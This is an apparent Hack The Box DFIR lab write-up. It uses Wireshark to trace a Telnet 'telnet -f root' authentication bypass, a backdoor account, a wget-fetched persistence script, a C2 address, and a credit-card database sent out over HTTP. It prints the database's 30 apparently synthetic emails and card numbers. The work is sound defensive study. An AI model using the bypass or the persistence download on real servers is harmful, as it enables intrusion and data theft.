---
title: "Hack The Box: Telly"
date: 2026-07-23
summary: "A Very Easy Linux-based defensive lab analyzing network PCAP artifacts to investigate a backup server compromise. Wireshark analysis reveals the exploitation of a Telnet authentication bypass vulnerability to gain remote root access, followed by the creation of a backdoor user account, C2 persistence script deployment via wget, and the exfiltration of an unencrypted SQLite customer credit card database over an HTTP server."
platform: "Hack The Box"
type: "Defensive Lab"
os: "Linux"
difficulty: "Very Easy"
link: "https://app.hackthebox.com/sherlocks/Telly"
tags:
  - cve-2026-24061
  - dfir
  - sqlite
  - telnet
  - wireshark
---

# Executive Summary

On January 27, 2026, a critical security breach was detected on the organization's backup server, where an external attacker exploited a Telnet authentication bypass vulnerability to gain unauthorized root access. Following the intrusion, the threat actor established persistence by creating a backdoor account and deploying a malicious script to communicate with a Command and Control (C2) server, followed by exfiltrating a sensitive database (credit-cards-25-blackfriday.db) via a Python HTTP server. This incident resulted in the confirmed theft of 30 customer records containing Personally Identifiable Information (PII) and full credit card numbers, requiring immediate server isolation, forensic analysis, and regulatory notification.

# Sherlock Information

## Scenario

You are a Junior DFIR Analyst at an MSSP that provides continuous monitoring and DFIR services to SMBs. Your supervisor has tasked you with analyzing network telemetry from a compromised backup server. A DLP solution flagged a possible data exfiltration attempt from this server. According to the IT team, this server wasn't very busy and was sometimes used to store backups.

## Provided Artifacts

`monitoringservice_export_202610AM-11AM.pcapng` (SHA256: `b88942c3b5723a86637d717cb3415f1e3301914651f204905eeb9417909a765b`)

# Tasks

## Task 1

***Question: What CVE is associated with the vulnerability exploited in the Telnet protocol?***

Let’s check the contents of the given file with `wireshark`.

After opening the file, let’s filter for `telnet`.

Around 4 thousand packets are displayed after the filter. By following the stream of the first packet, we can see the following:

![Figure 1](/assets/images/writeups/hack-the-box-telly/hack-the-box-telly-fig-1.png)

<figcaption class="blog-image-caption">Figure 1</figcaption>

This seems to be captured Telnet session data.

A special thing about this login attempt is the `-f root` flag that is used.

By searching for `telnet -f root` online, we will come across a newly published CVE related to remote authentication bypass in Telnet:

![Figure 2](/assets/images/writeups/hack-the-box-telly/hack-the-box-telly-fig-2.png)

<figcaption class="blog-image-caption">Figure 2</figcaption>

***Answer: CVE-2026-&lt;REDACTED&gt;***

## Task 2

***Question: When was the Telnet vulnerability successfully exploited, granting the attacker remote root access on the target machine?***

By checking the rest of the content mentioned in the stream identified in Figure 1, we can instantly see the banner of successful login:

![Figure 3](/assets/images/writeups/hack-the-box-telly/hack-the-box-telly-fig-3.png)

<figcaption class="blog-image-caption">Figure 3</figcaption>

By checking the associated packet of the banner, we can identify the time of the login (Don’t forget to switch to UTC time format through View → Time Display Format → UTC Date and Time of Day).

***Answer: 2026-01-27 10:&lt;REDACTED&gt;***

## Task 3

***Question: What is the hostname of the targeted server?***

After browsing the data in the stream a bit more, we will come across the prompt identifier which contains the hostname:

![Figure 4](/assets/images/writeups/hack-the-box-telly/hack-the-box-telly-fig-4.png)

<figcaption class="blog-image-caption">Figure 4</figcaption>

***Answer: bac&lt;REDACTED&gt;***

## Task 4

***Question: The attacker created a backdoor account to maintain future access. What username and password were set for that account?***

Continue checking the contents of the stream and you will find a command executed where the attacker created a new account:

![Figure 5](/assets/images/writeups/hack-the-box-telly/hack-the-box-telly-fig-5.png)

<figcaption class="blog-image-caption">Figure 5</figcaption>

***Answer: cle&lt;REDACTED&gt;:YouK&lt;REDACTED&gt;***

## Task 5

***Question: What was the full command the attacker used to download the persistence script?***

By checking the rest of the data in the stream, we can identify signs of downloaded malicious persistence script:

![Figure 6](/assets/images/writeups/hack-the-box-telly/hack-the-box-telly-fig-6.png)

<figcaption class="blog-image-caption">Figure 6</figcaption>

***Answer: wget https://raw.githubusercontent.com/mon&lt;REDACTED&gt;***

## Task 6

***Question: The attacker installed remote access persistence using the persistence script. What is the C2 IP address?***

By checking the data following the download and execution of the persistence script, we can identify what seem to be IP-related artifacts, which most likely were typed as part of persistence configuration:

![Figure 7](/assets/images/writeups/hack-the-box-telly/hack-the-box-telly-fig-7.png)

<figcaption class="blog-image-caption">Figure 7</figcaption>

***Answer: 91.99.&lt;REDACTED&gt;***

## Task 7

***Question: The attacker exfiltrated a sensitive database file. At what time was this file exfiltrated?***

Continue checking the contents of the stream and you will find a database file that seems sensitive based on its name:

![Figure 8](/assets/images/writeups/hack-the-box-telly/hack-the-box-telly-fig-8.png)

<figcaption class="blog-image-caption">Figure 8</figcaption>

Below this directly is what seems to be an attempt from the attacker to exfiltrate the file through a python HTTP server:

![Figure 9](/assets/images/writeups/hack-the-box-telly/hack-the-box-telly-fig-9.png)

<figcaption class="blog-image-caption">Figure 9</figcaption>

The log clearly shows the time of the exfiltration.

***Answer: 2026-01-27 10:49:&lt;REDACTED&gt;***

## Task 8

***Question: Analyze the exfiltrated database. To follow compliance requirements, the breached organization needs to notify its customers. For data validation purposes, find the credit card number for a customer named Quinn Harris.***

Wireshark gives the feature of downloading files captured in the packet capture, through going to File → Export Objects → HTTP. The database file will be right there:

![Figure 10](/assets/images/writeups/hack-the-box-telly/hack-the-box-telly-fig-10.png)

<figcaption class="blog-image-caption">Figure 10</figcaption>

Let’s save the file and check its contents using `sqlite3`:

```bash
$ file credit-cards-25-blackfriday.db 
credit-cards-25-blackfriday.db: SQLite 3.x database, last written using SQLite version 3046001, file counter 7, database pages 3, cookie 0x7, schema 4, UTF-8, version-valid-for 7

$ sqlite3 credit-cards-25-blackfriday.db      
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.

sqlite> .tables
purchases

sqlite> .schema purchases
CREATE TABLE purchases (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  email TEXT NOT NULL,
  creditcardnumber INTEGER NOT NULL,
  purchase_date TEXT NOT NULL,   -- ISO date: YYYY-MM-DD
  item_purchased TEXT NOT NULL
)
```

So the third column represents the credit card number.

Let’s check its value associated with the specific user:

```bash
sqlite> select * from purchases;
1|alex.morgan@gmail.com|4539682995824395|2025-11-27|Wireless earbuds
2|sam.taylor@hotmail.com|5424187310928476|2025-11-28|Laptop
3|jordan.lee@gmail.com|4916738021459982|2025-11-29|Smartphone
4|casey.park@hotmail.com|5190026847315569|2025-11-30|Bluetooth speaker
5|taylor.chen@gmail.com|4023567190842237|2025-12-01|Smartwatch
6|morgan.ross@hotmail.com|5578129403617724|2025-12-02|Tablet
7|jamie.khan@gmail.com|4485123096741186|2025-12-03|USB-C hub
8|riley.patel@hotmail.com|5109346672819053|2025-12-04|External SSD
9|devon.ng@gmail.com|4670912384567021|2025-12-05|Gaming mouse
10|skyler.wong@hotmail.com|5234907812669348|2025-12-06|Mechanical keyboard
11|avery.singh@gmail.com|4147098863215504|2025-12-07|Noise-cancelling headphones
12|quinn.harris@hotmail.com|5312<REDACTED>|2025-12-08|4K monitor
13|reese.clark@gmail.com|4019283746650197|2025-12-09|Portable charger
14|peyton.adams@hotmail.com|5561048937712906|2025-12-10|Wi-Fi router
15|harper.baker@gmail.com|4920187364501293|2025-12-11|Action camera
16|rowan.mills@hotmail.com|5408619927743018|2025-12-12|Drone
17|drew.evans@gmail.com|4638201947563317|2025-12-02|E-reader
18|logan.scott@hotmail.com|5207743198604425|2025-11-27|Smart home camera
19|kai.reed@gmail.com|4096127735501842|2025-12-06|Smart light bulbs
20|blake.turner@hotmail.com|5536901274485011|2025-11-30|VR headset
21|finley.hughes@gmail.com|4701832699047716|2025-12-01|Graphics tablet
22|river.ward@hotmail.com|5162087341196502|2025-12-09|Fitness tracker
23|charlie.diaz@gmail.com|4267091182306649|2025-12-03|Streaming stick
24|emerson.gray@hotmail.com|5478123065901147|2025-11-28|Portable projector
25|sage.brooks@gmail.com|4156609273184408|2025-12-10|Dash cam
26|cameron.bell@hotmail.com|5299001843765520|2025-12-04|Microphone
27|dakota.cooper@gmail.com|4381176029950315|2025-12-07|Webcam
28|marley.howard@hotmail.com|5523419876027783|2025-11-29|Surge protector power strip
29|phoenix.price@gmail.com|4619920371846650|2025-12-05|Electric toothbrush
30|jesse.ramos@hotmail.com|5183762094419087|2025-12-08|Raspberry Pi starter kit
```

***Answer: 5312&lt;REDACTED&gt;***

---

# Business Impact

## Confidentiality

**Critical.** The attacker exfiltrated an unencrypted database (`credit-cards-25-blackfriday.db`) containing PII and full credit card numbers for 30 customers. This breach likely violates data protection regulations (GDPR/PCI-DSS) and exposes the organization to legal penalties and reputational damage.

## Integrity

**High.** The server is no longer trustworthy. Root-level access allowed the attacker to install backdoors and potentially tamper with stored backup files, rendering the system's state compromised.

## Availability

**Medium.** The server must be taken offline for forensic analysis and reimaging, disrupting backup operations. If the attacker had deleted the backups, the organization would have faced permanent data loss.

# Remediation

- **Isolate & Contain:** Immediately disconnect the server from the network to disrupt the C2 connection.
- **Block Traffic:** Add the attacker's C2 IP and malicious URL domains to firewall/IDS blocklists.
- **Wipe & Rebuild:** Do not attempt to clean the infected system; wipe the server and rebuild from a known clean image.
- **Harden Access:** Permanently disable Telnet and enforce SSH with key-based authentication.
- **Patch & Rotate:** Apply the patch for the identified CVE and force a password reset for all associated accounts.
- **Notify:** Initiate breach notification for the 30 affected customers regarding their compromised credit card data.